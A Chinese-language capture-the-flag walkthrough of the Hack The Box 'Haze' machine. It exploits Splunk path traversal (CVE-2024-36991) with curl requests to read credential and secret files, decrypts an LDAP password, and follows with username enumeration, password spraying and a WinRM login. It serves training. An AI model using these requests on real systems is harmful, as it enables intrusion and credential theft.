{"pageProps":{"postData":{"id":"HackTheBoxSeason7-Haze","contentHtml":"<h1>Season7-Haze</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/competitive/7/overview\">https://app.hackthebox.com/competitive/7/overview</a> | <code>Hard</code> | <code>Windows</code></p>\n</blockquote>\n<h2>前期踩点</h2>\n<p>使用 <code>nmap</code> 进行扫描</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze  nmap -sT -min-rate 10000 -p- 10.10.11.61\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 01:04 EDT\nWarning: 10.10.11.61 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.61\nHost is up (0.33s latency).\nNot shown: 59223 closed tcp ports (conn-refused), 6285 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n8000/tcp  open  http-alt\n8088/tcp  open  radan-http\n8089/tcp  open  unknown\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n56730/tcp open  unknown\n56739/tcp open  unknown\n56740/tcp open  unknown\n56742/tcp open  unknown\n56779/tcp open  unknown\n56941/tcp open  unknown\n</code></pre>\n<p>添加域名<code>haze.htb</code> 和 <code>dc01.haze.htb</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze  nmap -sT -A -T4 -O -p 53,135,139,389,445,464,593,636,3268,3269,5985,8000,8088,8089,9389,47001,49664,49665,49666,49667,49668,56730,56739,56740,56742,56779,56941 10.10.11.61\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 01:10 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.61\nHost is up (0.41s latency).                                                                              \n                                                                                                         \nPORT      STATE SERVICE       VERSION \n53/tcp    open  domain        Simple DNS Plus                                                            \n135/tcp   open  msrpc         Microsoft Windows RPC \n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                              \n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)                                                                                          \n|_ssl-<span class=\"hljs-built_in\">date</span>: TLS randomness does not represent <span class=\"hljs-keyword\">time</span>  \n| ssl-cert: Subject: commonName=dc01.haze.htb       \n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:dc01.haze.htb             \n| Not valid before: 2025-03-05T07:12:20                                                                  \n|_Not valid after:  2026-03-05T07:12:20             \n445/tcp   open  microsoft-ds?                       \n464/tcp   open  kpasswd5?                           \n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                        \n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)                                                                                          \n|_ssl-<span class=\"hljs-built_in\">date</span>: TLS randomness does not represent <span class=\"hljs-keyword\">time</span>  \n| ssl-cert: Subject: commonName=dc01.haze.htb       \n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:dc01.haze.htb             \n| Not valid before: 2025-03-05T07:12:20                                                                  \n|_Not valid after:  2026-03-05T07:12:20             \n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)                                                                                          \n|_ssl-<span class=\"hljs-built_in\">date</span>: TLS randomness does not represent <span class=\"hljs-keyword\">time</span>                                                                                                                                                                 \n| ssl-cert: Subject: commonName=dc01.haze.htb      \n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:dc01.haze.htb         \n| Not valid before: 2025-03-05T07:12:20                                                                  \n|_Not valid after:  2026-03-05T07:12:20                                                                  \n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)                                                                                          | ssl-cert: Subject: commonName=dc01.haze.htb                                                            \n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:dc01.haze.htb                                                                                                                       | Not valid before: 2025-03-05T07:12:20                                                                                                                                                                            \n|_Not valid after:  2026-03-05T07:12:20                                                                  \n|_ssl-<span class=\"hljs-built_in\">date</span>: TLS randomness does not represent <span class=\"hljs-keyword\">time</span>                                                                                                                                                                 \n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                                              \n|_http-title: Not Found                                                                                  \n|_http-server-header: Microsoft-HTTPAPI/2.0                                                              \n8000/tcp  open  http          Splunkd httpd                                                                                                                                                                        \n|_http-server-header: Splunkd                                                                            \n| http-robots.txt: 1 disallowed entry \n|_/                                       \n| http-title: Site doesn<span class=\"hljs-string\">'t have a title (text/html; charset=UTF-8).                  \n|_Requested resource was http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F               \n8088/tcp  open  ssl/http      Splunkd httpd\n| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser  \n| Not valid before: 2025-03-05T07:29:08                                                                  \n|_Not valid after:  2028-03-04T07:29:08                                                                                                                                                                            \n| http-robots.txt: 1 disallowed entry                                                                                                                                                                              \n|_/                                                                                                      \n|_http-title: 404 Not Found     \n|_http-server-header: Splunkd                                                                            \n8089/tcp  open  ssl/http      Splunkd httpd                                                              \n|_http-server-header: Splunkd         \n| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser                      \n| Not valid before: 2025-03-05T07:29:08             \n|_Not valid after:  2028-03-04T07:29:08                                                                  \n|_http-title: splunkd                                                                                                                                                                                              \n| http-robots.txt: 1 disallowed entry               \n|_/                                                 \n9389/tcp  open  mc-nmf        .NET Message Framing                                                       \n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                    \n|_http-server-header: Microsoft-HTTPAPI/2.0         \n|_http-title: Not Found                             \n49664/tcp open  msrpc         Microsoft Windows RPC \n49665/tcp open  msrpc         Microsoft Windows RPC                                                      \n49666/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                \n49667/tcp open  msrpc         Microsoft Windows RPC \n49668/tcp open  msrpc         Microsoft Windows RPC \n56730/tcp open  msrpc         Microsoft Windows RPC                                                      \n56739/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                        \n56740/tcp open  msrpc         Microsoft Windows RPC \n56742/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                \n56779/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                \n56941/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose                                                                             \nRunning (JUST GUESSING): Microsoft Windows 10|2022|2016|2012|2019|Vista|11|7|8.1|2008 (93%)              \nOS CPE: cpe:/o:microsoft:windows_10:1703 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_7:::ultimate cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2008::sp2                    \nAggressive OS guesses: Microsoft Windows 10 1703 (93%), Windows Server 2022 (93%), Microsoft Windows Server 2016 build 10586 - 14393 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2019 (93%), Microsoft Windows Server 2016 (93%), Microsoft Windows 10 1511 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Server 2022 (91%), Microsoft Windows 11 21H2 (91%)                                   \nNo exact OS matches for host (test conditions non-ideal).                                                \nNetwork Distance: 2 hops                                                                                                                                                                                           \nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                               \n                                                                                                         \nHost script results:                                                                                     \n|_clock-skew: 7h41m12s                                                                                                                                                                                             \n| smb2-security-mode:                                                                                    \n|   3:1:1:                            \n|_    Message signing enabled and required\n| smb2-time:                                                                                             \n|   date: 2025-03-31T12:53:32                                                                            \n|_  start_date: N/A                        \n                                                                                                         \nTRACEROUTE (using proto 1/icmp)                                                                          \nHOP RTT       ADDRESS                                                                                                                                                                                              \n1   461.62 ms xxxxxxx                                                                                                                                                                                           \n2   286.29 ms 10.10.11.61                                                                                \n                                                    \nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .    \nNmap done: 1 IP address (1 host up) scanned in 116.57 seconds                 \n</span></code></pre>\n<p>尝试枚举 SMB 和 LDAP 匿名</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze  smbclient -L dc01.haze.htb                                                \nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\root]:   \n\n⚡ root@kali  ~/Desktop/test/Haze  ldapsearch -x -H ldap://dc01.haze.htb                                                                                                  \n<span class=\"hljs-comment\"># extended LDIF</span>\n<span class=\"hljs-comment\">#</span>\n<span class=\"hljs-comment\"># LDAPv3</span>\n<span class=\"hljs-comment\"># base &#x3C;> (default) with scope subtree</span>\n<span class=\"hljs-comment\"># filter: (objectclass=*)</span>\n<span class=\"hljs-comment\"># requesting: ALL</span>\n<span class=\"hljs-comment\">#</span>\n\n<span class=\"hljs-comment\"># search result</span>\nsearch: 2\nresult: 1 Operations error\ntext: 000004DC: LdapErr: DSID-0C090CAF, comment: In order to perform this opera\n tion a successful <span class=\"hljs-built_in\">bind</span> must be completed on the connection., data 0, v4f7c\n\n<span class=\"hljs-comment\"># numResponses: 1</span>\n</code></pre>\n<p>访问 <code>8000</code> 端口，运行的是<code>Splunk-Enterprise</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Haze/image64.png\" alt=\"image.png\"></p>\n<h2>Splunk</h2>\n<p>通过搜索引擎对其进行公开漏洞搜索，存在任意文件读取漏洞</p>\n<p>我们通过工具来扫描：<a href=\"https://github.com/bigb0x/CVE-2024-36991\">https://github.com/bigb0x/CVE-2024-36991</a></p>\n<p>得到几个域内用户名<code>Mark</code>，<code>paul</code>，<code>Edward</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze/CVE-2024-36991  python3 CVE-2024-36991.py -u http://dc01.haze.htb:8000                                  \n/root/Desktop/test/Haze/CVE-2024-36991/CVE-2024-36991.py:53: SyntaxWarning: invalid escape sequence <span class=\"hljs-string\">'\\ '</span>\n  <span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\")\n\n                                                                        \n  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _ \n / ___\\ \\   / | ____|   |___ \\ / _ |___ \\| || |      |___ / / /_ / _ \\ / _ \\/ |\n| |    \\ \\ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \\| '_ | (_) | (_) | |\n| |___  \\ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \\__, |\\__, | |\n \\____|  \\_/  |_____|   |_____|\\___|_____|  |_|      |____/ \\___/  /_/   /_/|_|\n                                                                           \n-> POC CVE-2024-36991. This exploit will attempt to read Splunk /etc/passwd file. \n-> By x.com/MohamedNab1l\n-> Use Wisely.\n\n[INFO] Testing single target: http://dc01.haze.htb:8000\n[VLUN] Vulnerable: http://dc01.haze.htb:8000\n:admin:$6<span class=\"hljs-variable\">$Ak3m7</span>.aHgb/NOQez<span class=\"hljs-variable\">$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1</span>::Administrator:admin:changeme@example.com:::20152\n:edward:$6$3LQHFzfmlpMgxY57<span class=\"hljs-variable\">$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22</span>/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152\n:mark:$6<span class=\"hljs-variable\">$j4QsAJiV8mLg</span>/bhA<span class=\"hljs-variable\">$Oa</span>/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152\n:paul:$6$Y5ds8NjDLd7SzOTW<span class=\"hljs-variable\">$Zg</span>/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152\n</span></code></pre>\n<p>但是靶机是<code>Windows</code>的，不会存在<code>/etc/passwd</code>文件，所以应该是容器</p>\n<p><a href=\"https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/Splunk%20Enterprise/Splunk-Enterprise%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md\">https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/Splunk%20Enterprise/Splunk-Enterprise%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md</a></p>\n<pre><code class=\"hljs language-bash\">GET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../windows/win.ini HTTP/1.1\nHost: x.x.x.x\nUser-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\nConnection: close\nAccept-Encoding: gzip\n</code></pre>\n<p>我们通过<code>curl</code> 来尝试，成功读取</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze/CVE-2024-36991  curl 10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../windows/win.ini \n; <span class=\"hljs-keyword\">for</span> 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\n[MAPI=1\n</code></pre>\n<h2>Splunk LFI 利用</h2>\n<p>根据目录结构来构造<code>LFI</code></p>\n<p>目录结构（官方）：<a href=\"https://docs.splunk.com/Documentation/Splunk/9.4.1/Admin/Listofconfigurationfiles\">https://docs.splunk.com/Documentation/Splunk/9.4.1/Admin/Listofconfigurationfiles</a></p>\n<ol>\n<li>\n<p><code>splunk/etc/system/local/inputs.conf</code></p>\n<pre><code class=\"hljs language-bash\">curl <span class=\"hljs-string\">\"http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../program%20files/splunk/etc/system/local/server.conf\"</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze/CVE-2024-36991  curl <span class=\"hljs-string\">\"http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/splunk/etc/system/local/server.conf\"</span>\n[general]\nserverName = dc01\npass4SymmKey = $7<span class=\"hljs-variable\">$lPCemQk01ejJvI8nwCjXjx7PJclrQJ</span>+SfC3/ST+K0s+1LsdlNuXwlA==\n\n[sslConfig]\nsslPassword = $7$/nq/of9YXJfJY+DzwGMxgOmH4Fc0dgNwc5qfCiBhwdYvg9+0OCCcQw==\n\n[lmpool:auto_generated_pool_download-trial]\ndescription = auto_generated_pool_download-trial\npeers = *\nquota = MAX\nstack_id = download-trial\n\n[lmpool:auto_generated_pool_forwarder]\ndescription = auto_generated_pool_forwarder\npeers = *\nquota = MAX\nstack_id = forwarder\n\n[lmpool:auto_generated_pool_free]\ndescription = auto_generated_pool_free\npeers = *\nquota = MAX\nstack_id = free\n\n</code></pre>\n</li>\n<li>\n<p><code>splunk/etc/passwd</code></p>\n<p>不是容器，而是<code>Splunk</code>的配置文件</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze/CVE-2024-36991  curl <span class=\"hljs-string\">\"http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/splunk/etc/passwd\"</span>\n:admin:$6<span class=\"hljs-variable\">$Ak3m7</span>.aHgb/NOQez<span class=\"hljs-variable\">$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1</span>::Administrator:admin:changeme@example.com:::20152\n:edward:$6$3LQHFzfmlpMgxY57<span class=\"hljs-variable\">$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22</span>/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152\n:mark:$6<span class=\"hljs-variable\">$j4QsAJiV8mLg</span>/bhA<span class=\"hljs-variable\">$Oa</span>/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152\n:paul:$6$Y5ds8NjDLd7SzOTW<span class=\"hljs-variable\">$Zg</span>/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152\n</code></pre>\n</li>\n<li>\n<p><code>splunk/etc/system/local/authentication.conf</code>\n其中 <code>bindDN</code> 是 <code>Paul Taylor</code>，并且 <code>bindDNpassword</code> 是加密的 <code>$7$</code> 格式（ GPT 说是 Splunk 的 <code>pass4SymmKey</code> 加密）</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze  curl <span class=\"hljs-string\">\"http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/splunk/etc/system/local/authentication.conf\"</span>\n[splunk_auth]\nminPasswordLength = 8\nminPasswordUppercase = 0\nminPasswordLowercase = 0\nminPasswordSpecial = 0\nminPasswordDigit = 0\n\n[Haze LDAP Auth]\nSSLEnabled = 0\nanonymous_referrals = 1\nbindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb\nbindDNpassword = $7<span class=\"hljs-variable\">$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN</span>+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=\ncharset = utf8\nemailAttribute = mail\nenableRangeRetrieval = 0\ngroupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb\ngroupMappingAttribute = dn\ngroupMemberAttribute = member\ngroupNameAttribute = cn\nhost = dc01.haze.htb\nnestedGroups = 0\nnetwork_timeout = 20\npagelimit = -1\nport = 389\nrealNameAttribute = cn\nsizelimit = 1000\ntimelimit = 15\nuserBaseDN = CN=Users,DC=haze,DC=htb\nuserNameAttribute = samaccountname\n\n[authentication]\nauthSettings = Haze LDAP Auth\nauthType = LDAP\n</code></pre>\n</li>\n<li>\n<p><code>splunk/etc/auth/splunk.secret</code></p>\n<p>通过对关键字“Splunk Secret” 的搜索，搜索到了：<a href=\"https://community.splunk.com/t5/Knowledge-Management/What-is-the-splunk-secret-file-and-is-it-possible-to-change-it/m-p/331207\">https://community.splunk.com/t5/Knowledge-Management/What-is-the-splunk-secret-file-and-is-it-possible-to-change-it/m-p/331207</a></p>\n<p>The splunk.secret file is located in the <code>$SPLUNK_HOME/etc/auth</code> directory. It is used to encrypt and decrypt the passwords in the Splunk configuration files.\nsplunk.secret 文件位于 <code>$SPLUNK_HOME/etc/auth</code> 目录中。它用于加密和解密 Splunk 配置文件中的密码。</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze  curl <span class=\"hljs-string\">\"http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/splunk/etc/auth/splunk.secret\"</span>      \nNfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD#   \n</code></pre>\n</li>\n</ol>\n<h2>Splunk.Secret</h2>\n<p>在 <code>GitHub</code> 对其该关键字进行搜索找到一个工具：<a href=\"https://github.com/HurricaneLabs/splunksecrets\">https://github.com/HurricaneLabs/splunksecrets</a></p>\n<p>splunksecrets is a tool for working with Splunk secrets offline</p>\n<p>splunksecrets 是一种用于离线使用 Splunk 密钥的工具</p>\n<p>将<code>Splunk.Secret</code>保存到本地，使用<code>splunksecrets</code>进行破解</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze  splunksecrets splunk-decrypt -S splunk.secret --ciphertext <span class=\"hljs-string\">'$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='</span> \nLd@p_Auth_Sp1unk@2k24\n</code></pre>\n<p>得到密码<code>Ld@p_Auth_Sp1unk@2k24</code></p>\n<h2>枚举</h2>\n<p>拿到密码后进行枚举</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze  nxc smb 10.10.11.61 -u paul.taylor -p <span class=\"hljs-string\">'Ld@p_Auth_Sp1unk@2k24'</span>\nSMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.61     445    DC01             [+] haze.htb\\paul.taylor:Ld@p_Auth_Sp1unk@2k24 \n ⚡ root@kali  ~/Desktop/test/Haze  nxc ldap 10.10.11.61 -u paul.taylor -p <span class=\"hljs-string\">'Ld@p_Auth_Sp1unk@2k24'</span>\nSMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.61     389    DC01             [+] haze.htb\\paul.taylor:Ld@p_Auth_Sp1unk@2k24 \n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module <span class=\"hljs-keyword\">in</span> 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       10.10.11.61     5985   DC01             [-] haze.htb\\paul.taylor:Ld@p_Auth_Sp1unk@2k24\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze  smbclient -L dc01.haze.htb -U dc01.haze.htb/paul.taylor%<span class=\"hljs-string\">'Ld@p_Auth_Sp1unk@2k24'</span> --option=<span class=\"hljs-string\">'client min protocol=SMB2'</span>  \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nSMB1 disabled -- no workgroup available\n</code></pre>\n<p><code>SMB</code>找不到任何信息</p>\n<p>上面<code>LDAP</code>验证也是过的，我们直接使用<code>BloodHound</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze  bloodhound-python -u <span class=\"hljs-string\">'paul.taylor'</span> -p <span class=\"hljs-string\">'Ld@p_Auth_Sp1unk@2k24'</span> -d <span class=\"hljs-string\">'haze.htb'</span> -ns 10.10.11.61 --zip -c All -dc <span class=\"hljs-string\">'dc01.haze.htb'</span>\nINFO: Found AD domain: haze.htb\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: dc01.haze.htb\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: dc01.haze.htb\nINFO: Found 3 <span class=\"hljs-built_in\">users</span>\nINFO: Found 32 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 2 ous\nINFO: Found 18 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: dc01.haze.htb\nINFO: Done <span class=\"hljs-keyword\">in</span> 01M 01S\nINFO: Compressing output into 20250331033810_bloodhound.zip\n</code></pre>\n<p>使用<code>BloodHound</code>进行分析</p>\n<p>Paul是<code>RESTRICTED USERS@HAZE.HTB</code>组的成员，受限用户，并且只能找到三个用户<code>paul.taylor</code>，<code>Haze-IT-Backup$</code> ，<code>dc01$</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Haze/image65.png\" alt=\"image.png\"></p>\n<p>对域进行用户名枚举，任何再对其进行密码喷洒，因为之前还得到了<code>MARK</code>和<code>Edward</code> 等用户，但是名不全没办法进行利用</p>\n<p>字典来自于：<a href=\"https://github.com/zer0yu/Berserker\">https://github.com/zer0yu/Berserker</a> （试了好多字典）</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools  ./kerbrute_linux_amd64 userenum --dc 10.10.11.61 -d haze.htb ~/Desktop/test/Haze/Berserker/brute/common/username/usernames_5000.txt \n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&#x3C; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: dev () - 03/31/25 - Ronnie Flathers @ropnop\n\n2025/03/31 04:16:53 >  Using KDC(s):\n2025/03/31 04:16:53 >   10.10.11.61:88\n\n2025/03/31 04:17:33 >  [+] VALID USERNAME:       paul.taylor@haze.htb\n2025/03/31 04:18:03 >  [+] VALID USERNAME:       edward.martin@haze.htb\n2025/03/31 04:20:39 >  [+] VALID USERNAME:       mark.adams@haze.htb\n2025/03/31 04:22:59 >  Done! Tested 5000 usernames (3 valid) <span class=\"hljs-keyword\">in</span> 365.646 seconds\n</code></pre>\n<p>得到三个用户</p>\n<pre><code class=\"hljs language-bash\">paul.taylor\nedward.martin\nmark.adams\n</code></pre>\n<p>再次进行枚举</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze  nxc smb 10.10.11.61 -u users.txt -p <span class=\"hljs-string\">'Ld@p_Auth_Sp1unk@2k24'</span>\nSMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.61     445    DC01             [+] haze.htb\\paul.taylor:Ld@p_Auth_Sp1unk@2k24 \n⚡ root@kali  ~/Desktop/test/Haze  nxc winrm 10.10.11.61 -u users.txt -p <span class=\"hljs-string\">'Ld@p_Auth_Sp1unk@2k24'</span>\nWINRM       10.10.11.61     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module <span class=\"hljs-keyword\">in</span> 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       10.10.11.61     5985   DC01             [-] haze.htb\\paul.taylor:Ld@p_Auth_Sp1unk@2k24\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module <span class=\"hljs-keyword\">in</span> 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       10.10.11.61     5985   DC01             [-] haze.htb\\edward.martin:Ld@p_Auth_Sp1unk@2k24\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module <span class=\"hljs-keyword\">in</span> 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       10.10.11.61     5985   DC01             [+] haze.htb\\mark.adams:Ld@p_Auth_Sp1unk@2k24 (Pwn3d!)\n⚡ root@kali  ~/Desktop/test/Haze  nxc ldap 10.10.11.61 -u users.txt -p <span class=\"hljs-string\">'Ld@p_Auth_Sp1unk@2k24'</span>\nSMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.61     389    DC01             [+] haze.htb\\paul.taylor:Ld@p_Auth_Sp1unk@2k24 \n</code></pre>\n<p><code>mark.adams</code> 拥有 <code>winrm</code>  的凭据，使用<code>evil-winrm</code>进行登录</p>\n<p>登陆成功</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Haze  evil-winrm -i 10.10.11.61 -u mark.adams -p <span class=\"hljs-string\">'Ld@p_Auth_Sp1unk@2k24'</span>\n       